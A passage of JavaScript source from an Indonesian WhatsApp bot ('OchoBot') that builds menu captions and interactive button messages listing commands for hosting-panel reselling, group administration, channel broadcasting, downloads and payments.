┃ ϟ .delpanel-v2
┃ ϟ .delallserver-v2
┃ ϟ .delalluser-v2
┃ ϟ .deladmin-v2
┃ ϟ .delalladmin-v2
┃ ϟ .listpanel-v2
┃ ϟ .listadmin-v2
┃ ϟ .updomain
┃ ϟ .upapikey
┃ ϟ .upcapikey
┃ ϟ .addakses2
┃ ϟ .addreseller-v2
┃ ϟ .delakses2
┃ ϟ .delreseller-v2
┃ ϟ .listreseller-v2
┃ ϟ .resetreseller-v2
┃ ϟ .totalpanel-v2
┃ ϟ .totaladmin-v2
┃ ϟ .linkserver
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧* ]
┃ ϟ .installprotect1
┃ ϟ .installprotect2
┃ ϟ .installprotect3
┃ ϟ .installprotect4
┃ ϟ .installprotect5
┃ ϟ .installprotect6
┃ ϟ .installprotect7
┃ ϟ .installprotect8
┃ ϟ .installprotect9
┃ ϟ .installprotect10
┃ ϟ .installprotect11
┃ ϟ .installprotect12
┃ ϟ .installprotect13
┃ ϟ .installprotect14
┃ ϟ .installprotect15
┃ ϟ .installprotect16
┃ ϟ .installprotectall
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗣𝗥𝗢𝗧𝗘𝗖𝗧* ]
┃ ϟ .uninstallprotect1
┃ ϟ .uninstallprotect2
┃ ϟ .uninstallprotect3
┃ ϟ .uninstallprotect4
┃ ϟ .uninstallprotect5
┃ ϟ .uninstallprotect6
┃ ϟ .uninstallprotect7
┃ ϟ .uninstallprotect8
┃ ϟ .uninstallprotect9
┃ ϟ .uninstallprotect10
┃ ϟ .uninstallprotect11
┃ ϟ .uninstallprotect12
┃ ϟ .uninstallprotect13
┃ ϟ .uninstallprotect14
┃ ϟ .uninstallprotect15
┃ ϟ .uninstallprotect16
┃ ϟ .uninstallprotectall
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗣𝗥𝗢𝗧𝗘𝗖𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addsp
┃ ϟ .delsp
┃ ϟ .resetsp
┃ ϟ .listsp
┃ ϟ .addop
┃ ϟ .delop
┃ ϟ .resetop
┃ ϟ .listop
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .hackbackpanel
┃ ϟ .installpanel
┃ ϟ .uninstallpanel
┃ ϟ .installtema
┃ ϟ .uninstallthema
┃ ϟ .startwings
┃ ϟ .subdomain
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨* ]
┃ ϟ .add
┃ ϟ .kick
┃ ϟ .close
┃ ϟ .open
┃ ϟ .hidetag
┃ ϟ .kudetagc
┃ ϟ .leave
┃ ϟ .tagall
┃ ϟ .promote
┃ ϟ .demote
┃ ϟ .resetlinkgc
┃ ϟ .getdeskgc
┃ ϟ .totalmember
┃ ϟ .linkgc
┃ ϟ .bljpm
┃ ϟ .delbljpm
┃ ϟ .listdaftarjpm
┃ ϟ .listonline
┃ ϟ .listgrup
┃ ϟ .joingrup
┃ ϟ .getppgrup
┃ ϟ .getpp
┃ ϟ .buatgc
┃ ϟ .antilink
┃ ϟ .antilinkch
┃ ϟ .antikataunchek
┃ ϟ .welcome
┃ ϟ .setwelcome
┃ ϟ .setgoodbye
┃ ϟ .upswgc
┃ ϟ .autojpmgb on/off/status
┃ ϟ .setjpmgb
┃ ϟ .delsetjpmgb
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨* ]
┃ ϟ .brat
┃ ϟ .tourl
┃ ϟ .tourl2
┃ ϟ .berita
┃ ϟ .ssweb
┃ ϟ .translate
┃ ϟ .infogempa
┃ ϟ .infocuaca
┃ ϟ .wallpaper
┃ ϟ .shortlink
┃ ϟ .shortlink-dl
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨* ]
┃ ϟ .addrespon
┃ ϟ .delrespon
┃ ϟ .listrespon
┃ ϟ .done
┃ ϟ .proses
┃ ϟ .jpm
┃ ϟ .jpm2
┃ ϟ .jpm3
┃ ϟ .jpmht
┃ ϟ .jpmtesti
┃ ϟ .jpmslide
┃ ϟ .jpmslideht
┃ ϟ .sendtesti
┃ ϟ .payment
┃ ϟ .pushkontak
┃ ϟ .cekidgrup
┃ ϟ .savekontak
┃ ϟ .setjedapush
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗠𝗘𝗡𝗨* ]
┃ ϟ .jpmchmenu
┃ ϟ .jpmchteks
┃ ϟ .jpmchbutton
┃ ϟ .jpmchfoto
┃ ϟ .jpmchvideo
┃ ϟ .jpmchaudio
┃ ϟ .jpmchdoc
┃ ϟ .setdelayjpmch
┃ ϟ .setbotjpmch
┃ ϟ .autojpmch
┃ ϟ .addteks
┃ ϟ .delteks
┃ ϟ .listteks
┃ ϟ .statusjpmch
┃ ϟ .jpmchjumlah
┃ ϟ .jpmchvip
┃ ϟ .addptjs
┃ ϟ .delptjs
┃ ϟ .addownjs
┃ ϟ .delownjs
┃ ϟ .addid
┃ ϟ .addidch
┃ ϟ .addallid
┃ ϟ .delid
┃ ϟ .delallid
┃ ϟ .listid
┃ ϟ .seturlsatu
┃ ϟ .seturldua
┃ ϟ .joinchannel
┃ ϟ .createch
┃ ϟ .sync
┃ ϟ .antikatach
┃ ϟ .jpmchnew
┃ ϟ .listch
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗠𝗘𝗡𝗨* ]
┃ ϟ .dana
┃ ϟ .ovo
┃ ϟ .gopay
┃ ϟ .qris
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨* ]
┃ ϟ .cekidch
┃ ϟ .cekidgc
┃ ϟ .reactch
┃ ϟ .rvo
┃ ϟ .qc
┃ ϟ .stiker
┃ ϟ .stikerwm
┃ ϟ .pinterest
┃ ϟ .buatgambar
┃ ϟ .emojimix
┃ ϟ .emojitogif
┃ ϟ .iqc
┃ ϟ .iqc2
┃ ϟ .hd
┃ ϟ .hd2
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨* ]
┃ ϟ .tiktok
┃ ϟ .tiktokmp3
┃ ϟ .facebook
┃ ϟ .capcut
┃ ϟ .instagram
┃ ϟ .ytmp3
┃ ϟ .ytmp4
┃ ϟ .play
┃ ϟ .playvid
┃ ϟ .mediafire
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗖𝗥𝗘𝗔𝗧𝗘 𝗪𝗘𝗕 𝗠𝗘𝗡𝗨* ]
┃ ϟ .createweb
┃ ϟ .createweb2
┃ ϟ .scweb
┃ ϟ .listweb
┃ ϟ .listweb2
┃ ϟ .delweb
╰━━━━━━━━━━━━━━━━━━━━

╭━━━━[ *𝗔𝗗𝗗 𝗦𝗘𝗟𝗟𝗘𝗥 𝗪𝗘𝗕* ]
┃ ϟ .addsellerweb
┃ ϟ .delsellerweb
┃ ϟ .listsellerweb
┃ ϟ .resetsellerweb
╰━━━━━━━━━━━━━━━━━━━━
`

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1":
case "v1":
case "luffy":
case "menu1": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");
    
    let name = m.pushName || "Pengguna";
    let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*
`;

    await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, // contoh: "120363421885507252@newsletter"
                newsletterName: global.namaSaluran, // contoh: "Marceleven Official"
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            },
            {
                buttonId: '.menuslide', 
                buttonText: { displayText: '🔄 𝐒𝐥𝐢𝐝𝐞 𝐌𝐞𝐧𝐮' }, 
                type: 1 
            },
            {  
                buttonId: '.semua', 
                buttonText: { displayText: '📚 𝐀𝐥𝐥 𝐌𝐞𝐧𝐮' }, 
                type: 1 
            },
            { 
                buttonId: '.owner', 
                buttonText: { displayText: '👑 𝐎𝐰𝐧𝐞𝐫' }, 
                type: 1 
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "help": {
 let teksnya = `Haii @${m.sender.split("@")[0]},
Perkenalkan, saya adalah *${global.botname2}*.

Keunggulan Layanan CS Kami:
✅ Cepat & Responsif – Waktu tanggapan yang optimal untuk kepuasan pelanggan.
✅ Profesional & Ramah – Pelayanan dilakukan dengan etika komunikasi yang baik.
✅ Solusi yang Efektif – Penyelesaian masalah secara tepat dan efisien.
✅ Dukungan Berkelanjutan – Pelanggan dapat terus memperoleh bantuan kapan pun diperlukan.

Hubungi CS KAMI
wa.me/6283840240138 *[ Wa ]*
https://t.me//alluffystore *[ Tele ]*


*#Jika ingin membeli produk silakan hubungi admin kami*
`

 await conn.sendMessage(m.chat, {
 video: fs.readFileSync('./media/Ocho.mp4'), // <- Video lokal
 caption: teksnya,
 mimetype: 'video/mp4',
 gifPlayback: false,
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.menu`,
 buttonText: { displayText: 'Menu' },
 type: 1
 },
 {
 buttonId: `.all`,
 buttonText: { displayText: 'All Menu' },
 type: 1
 },
 {
 buttonId: `.owner`,
 buttonText: { displayText: 'Hubungi Developer' },
 type: 1
 }
 ],
 headerType: 4, // Khusus video
 contextInfo: {
 mentionedJid: [m.sender]
 }
 }, { quoted: m })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "panelmenuv1": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 𝗩1* ]
┃ ϟ .1gb
┃ ϟ .2gb
┃ ϟ .3gb
┃ ϟ .4gb
┃ ϟ .5gb
┃ ϟ .6gb
┃ ϟ .7gb
┃ ϟ .8gb
┃ ϟ .9gb
┃ ϟ .10gb
┃ ϟ .unlimited
┃ ϟ .createserver
┃ ϟ .cadp
┃ ϟ .cadmin
┃ ϟ .delpanel
┃ ϟ .delallserver
┃ ϟ .delalluser
┃ ϟ .deladmin
┃ ϟ .delalladmin
┃ ϟ .listpanel
┃ ϟ .listadmin
┃ ϟ .updomain
┃ ϟ .upapikey
┃ ϟ .upcapikey
┃ ϟ .addakses
┃ ϟ .addreseller
┃ ϟ .delakses
┃ ϟ .delreseller
┃ ϟ .listreseller
┃ ϟ .resetreseller
┃ ϟ .totalpanel
┃ ϟ .totaladmin
┃ ϟ .linkserver
╰━━━━━━━━━━━━━━━━━━━━
`;

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "panelmenuv2": {
    // Mendapatkan waktu, tanggal, dan hari saat ini dengan zona waktu WIB (GMT+7)
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
    });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT MARCEL JPMCH*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗣𝗔𝗡𝗘𝗟 𝗠𝗘𝗡𝗨 𝗩2* ]
┃ ϟ .1gb-v2
┃ ϟ .2gb-v2
┃ ϟ .3gb-v2
┃ ϟ .4gb-v2
┃ ϟ .5gb-v2
┃ ϟ .6gb-v2
┃ ϟ .7gb-v2
┃ ϟ .8gb-v2
┃ ϟ .9gb-v2
┃ ϟ .10gb-v2
┃ ϟ .unlimited-v2
┃ ϟ .createserver2
┃ ϟ .cadp
┃ ϟ .cadmin
┃ ϟ .delpanel-v2
┃ ϟ .delallserver-v2
┃ ϟ .delalluser-v2
┃ ϟ .deladmin-v2
┃ ϟ .delalladmin-v2
┃ ϟ .listpanel-v2
┃ ϟ .listadmin-v2
┃ ϟ .updomain
┃ ϟ .upapikey
┃ ϟ .upcapikey
┃ ϟ .addakses2
┃ ϟ .addreseller-v2
┃ ϟ .delakses2
┃ ϟ .delreseller-v2
┃ ϟ .listreseller-v2
┃ ϟ .resetreseller-v2
┃ ϟ .totalpanel-v2
┃ ϟ .totaladmin-v2
┃ ϟ .linkserver
╰━━━━━━━━━━━━━━━━━━━━
`;

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
                                    { "title": "Cpanel Menu v1⚙️", "id": ".panelmenuv1", "description": "Menu Create Panel V1." },
                                    { "title": "Cpanel Menu v2⚙️", "id": ".panelmenuv2", "description": "Menu Create Panel V2." },
                                    { "title": "Download Menu 🔎", "id": ".downloadmenu", "description": "Kumpulan menu tambahan membantu mendownload." },
                                    { "title": "Tools Menu 📝", "id": ".toolsmenu", "description": "Kumpulan menu tambahan membantu." },
                                    { "title": "Other Menu 📂", "id": ".othermenu", "description": "Kumpulan menu tambahan dengan berbagai fungsi bermanfaat." },
                                    { "title": "Store Menu 🏪", "id": ".storemenu", "description": "Akses toko digital untuk membeli produk dan layanan." },
                                    { "title": "Payment Menu 💳", "id": ".paymentmenu", "description": "Kelola transaksi pembayaran dan metode keuangan." },
                                    { "title": "Protect Menu 💾", "id": ".protectmenu", "description": "Membantu Anda Menginstal Protect Dengan Mudah." },
                                    { "title": "Installer Menu 💫", "id": ".installermenu", "description": "Membantu Anda Menginstal Vps Dengan Mudah." },
                                    { "title": "Group Menu 👥", "id": ".groupmenu", "description": "Mengelola dan berinteraksi dengan grup komunitas atau pengguna." },
                                    { "title": "Channel Menu 🔰", "id": ".channelmenu", "description": "Menu Channel WhatsApp." },
                                    { "title": "Owner Menu 👑", "id": ".ownermenu", "description": "Menu eksklusif bagi pemilik sistem untuk kontrol penuh." },
                                    { "title": "Jasher Menu ✨", "id": ".jpmchmenu", "description": "Menu Kalo Kalian Open Jasher." },
                                    { "title": "Create Web Menu 🌐", "id": ".createwebmenu", "description": "Menu Create Website Html." },
                                    { "title": "Help ❓", "id": ".help", "description": "Panduan dan bantuan dalam menggunakan fitur sistem." }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 4,
        viewOnce: true,
    }, { quoted: qtext2 });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "groupmenu": {
    const currentDate = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
    const days = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu"];
    const day = days[currentDate.getDay()];
    const date = currentDate.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const time = currentDate.toLocaleTimeString("id-ID");

    let name = m.pushName || "Pengguna"; // ✅ Tambahkan ini
 let teks = `\`▧✨ O C H O B O T ✨▧\`
Hai, aku adalah OchoBot. Bot CPanel yang siap membantumu dalam mengurus panel, dan tools lainnya. Senang bisa membantumu 🫱🏻‍🫲🏻

*INFO BOT OCHOBOT*
🤖 Bot Name : *${global.botname2}*
💿 Version : *${global.versi}*
📡 Mode : *${conn.public ? "🌍 Public" : "🔒 Self"}*
📅 Time : *${time}*
⚙️ Total Fitur : *${totalFitur()}*
👨🏻‍💻 Creator : *Al Luffy*
🤯 NEED PANEL VPS LEGAL? : https://zanspiwptero.shoppanel.my.id
*INFO USER :*
👤 Nama: *${name}*
💳 Status: *${isCreator ? "Owner" : isPremium ? "Reseller Panel" : "Free User"}*

╭━━━━[ *𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨* ]
┃ ϟ .add
┃ ϟ .kick
┃ ϟ .close
┃ ϟ .open
┃ ϟ .hidetag
┃ ϟ .kudetagc
┃ ϟ .leave
┃ ϟ .tagall
┃ ϟ .promote
┃ ϟ .demote
┃ ϟ .resetlinkgc
┃ ϟ .getdeskgc
┃ ϟ .totalmember
┃ ϟ .linkgc
┃ ϟ .bljpm
┃ ϟ .delbljpm
┃ ϟ .listdaftarjpm
┃ ϟ .listonline
┃ ϟ .listgrup
┃ ϟ .joingrup
┃ ϟ .getppgrup
┃ ϟ .getpp
┃ ϟ .buatgc
┃ ϟ .antilink
┃ ϟ .antilinkch
┃ ϟ .antikataunchek
┃ ϟ .welcome
┃ ϟ .setwelcome
┃ ϟ .setgoodbye
┃ ϟ .upswgc
┃ ϟ .autojpmgb on/off/status
┃ ϟ .setjpmgb
┃ ϟ .delsetjpmgb
╰━━━━━━━━━━━━━━━━━━━━
`;

await conn.sendMessage(m.chat, {
        image: fs.readFileSync('./media/reply.jpg'),
        caption: teks,
        footer: `© 2025 ${global.botname2}`,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.namaOwner}@s.whatsapp.net`],
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran, 
                newsletterName: global.namaSaluran, 
                serverId: 200
            }
        },
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '𝐎𝐩𝐭𝐢𝐨𝐧 𝐌𝐞𝐧𝐮' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝐎𝐩𝐭𝐢𝐨𝐧',
                        sections: [
                            {
                                title: '𝙇𝙞𝙨𝙩 𝙈𝙚𝙣𝙪 𝙊𝙘𝙝𝙤𝘽𝙤𝙩',
                                rows: [
                                    { "title": "New Menu 🆕", "id": ".newmenu", "description": "Daftar menu terbaru yang telah ditambahkan ke sistem." },
